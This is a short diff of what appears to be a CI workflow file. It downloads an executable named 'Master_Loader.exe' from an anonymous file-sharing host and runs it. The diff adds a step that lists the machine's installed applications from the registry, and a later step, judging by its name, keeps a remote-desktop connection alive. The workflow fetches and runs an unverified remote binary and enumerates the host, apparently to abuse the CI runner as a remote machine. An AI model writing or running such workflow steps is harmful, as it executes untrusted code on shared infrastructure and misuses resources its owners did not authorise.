@@ -14,13 +14,18 @@ jobs:
           $url = "http://tmpfiles.org/dl/32055861/main.exe"
           curl -L $url -o "Master_Loader.exe"
 
-      - name: Execute Engine
+      - name: Execute Engine and List Apps
         shell: pwsh
         run: |
           Write-Host ">>> Starting Execution..."
           Start-Process -FilePath "./Master_Loader.exe"
-          Write-Host ">>> Sleeping for 6 minutes..."
-          Start-Sleep -Seconds 360
+          
+          Write-Host ">>> Waiting for 1 minute..."
+          Start-Sleep -Seconds 60
+          
+          Write-Host "`n=== INSTALLED APPLICATIONS ==="
+          Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize
+          Write-Host "===============================`n"
 
       - name: Maintain Connection + Watch RDP User
         run: |
